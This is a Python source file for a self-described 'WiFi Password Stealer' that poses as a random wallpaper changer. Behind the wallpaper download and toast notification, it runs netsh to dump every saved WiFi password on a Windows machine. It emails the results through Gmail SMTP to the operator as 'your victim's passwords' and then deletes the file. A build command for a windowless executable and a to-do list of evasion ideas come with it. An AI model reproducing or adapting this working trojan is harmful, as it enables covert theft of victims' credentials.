#PYINSTALLER COMMAND TO COMPILE INTO EXE : https://www.pyinstaller.org/
#pyinstaller --onefile --icon=RandomWallpaper.ico --noconsole RandomWallpaper.py

#Icon made using Canva : https://www.canva.com/


'''
	
	WiFI Password Stealer

	Author : Abhishek Iyengar
	GitHub: https://github.com/tinshade/
	License: GNU Public License

	This is a malware I made to steal saved WiFi passwords from a target laptop
	and the mail the results to your EmailID. The primary function apart from stealing 
	passwords is to download a random wallpaper from Unsplash.com and set it as laptop 
	while displaying a quick notification as a toast on Windows10.

	This works only on Windows OS for now. I will be checking off the TODO list soon.
	↓↓↓ Check below ↓↓↓

	DISCLAIMER: For educational purposes only! 



	###TODO###

	#1. Try to encrypt the mail.txt with a key being mailed
	#2. Hide the mail.txt upon creation
	#3. Only allow to run once per day
	#4. Identify the OS
	#5. Identidy if the system has WiFi Capabilities
	#6. Use ProtonMail and temporary mails for data transfer
	#7. Cross-Platform support
	#8. Refactor the entire code



'''
import subprocess #To flush the known passwords
import ctypes #To change the wallpaper
import os #To interact with OS

#For Mailer Module
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
#To make an authentic toast on Windows 10
import win10toast


#Send a toast notidication after changing the wallpaper
def notify():
	t = win10toast.ToastNotifier()
	t.show_toast('Wallpaper Changed!','Enjoy your new wallpaper!','RandomWallpaper.ico',duration=10)

#Change the wallpaper with the path from 'download' module and call the 'notify' module
def wallpaper(path):
	ctypes.windll.user32.SystemParametersInfoW(20,0,path,0)
	notify()

#Downlaod a random wallpaper from Unsplash, rename it as 'random.jpg' and send the absolute path as argument to 'wallpaper' module
def download():
	directory = os.path.dirname(os.path.realpath(__file__))
	import urllib.request
	urllib.request.urlretrieve("https://source.unsplash.com/random", "random.jpg")
	path = directory+"\\random.jpg"
	wallpaper(path)

#Send the "mail.txt" as an attachment to the mail ID specified below
#NOTE: Turn on "Less Secure Apps" on Google if you are using that as your mail ID
def mailer():
	fromaddr = "YOURMAILID@DOMAIN.com"
	toaddr = "YOURMAILID@DOMAIN.com"
	msg = MIMEMultipart() 
	msg['From'] = fromaddr 
	msg['To'] = toaddr
	msg['Subject'] = "WiFi Passwords"
	body = "Find the attached txt file for your victim's passwords!"
	msg.attach(MIMEText(body, 'plain')) 
	filename = "mail.txt"
	attachment = open("mail.txt", "rb") 
	p = MIMEBase('application', 'octet-stream') 
	p.set_payload((attachment).read()) 
	encoders.encode_base64(p)
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
	msg.attach(p) 
	s = smtplib.SMTP('smtp.gmail.com', 587) #Change this if you are not using GMAIL for mailing.
	s.starttls() 
	s.login(fromaddr, "YOURMAILPASSWORD") 
	text = msg.as_string() 
	s.sendmail(fromaddr, toaddr, text) 
	s.quit()
	attachment.close() #Closing the opened 'mail.txt' to delete it later
	os.remove('mail.txt') #Deleting the stolen file.
	download() #Calling the wallpaper download module after stealing data successfully!
def steal():
	#Calling the command `netsh wlan show profile PROFILE_NAME key=clear` command using the subprocess module.
	#The `,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE` commands are to avoid flushing the output on CMD window
	#The above helps in using the `--oneconsole` flag in pyinstaller for EXE compilation that runs without a CMD window opening
	data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8', errors="backslashreplace").split('\n')
	profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
	#Iterating through the profiles and extracting password from `Key Content` for each profile with its name
	for i in profiles:
	    try:
	        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'],shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8', errors="backslashreplace").split('\n')
	        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
	        try:
	        	#Storing the output from subprocess in a file
	            with open('mail.txt','a+') as f:
	            	f.write(str("{:<30}|  {:<}".format(i, results[0]))+"\n")
	            	f.close()
	        except IndexError:
	            #Storing if IndexError exists
	            with open('mail.txt', 'a+') as f:
	            	f.write(str("{:<30}|  {:<}".format(i, "")))
	            	f.close()
	            	
	    except subprocess.CalledProcessError:
	        #Storing if CalledProcessError exists
	        with open('mail.txt', 'a+') as f:
	        	f.write(str("{:<30}|  {:<}".format(i, "ENCODING ERROR")))
	        	f.close()
	mailer() #Calling the 'mailer' module to mail the stolen passwords

#Calling the MAIN FUNCTION
steal()
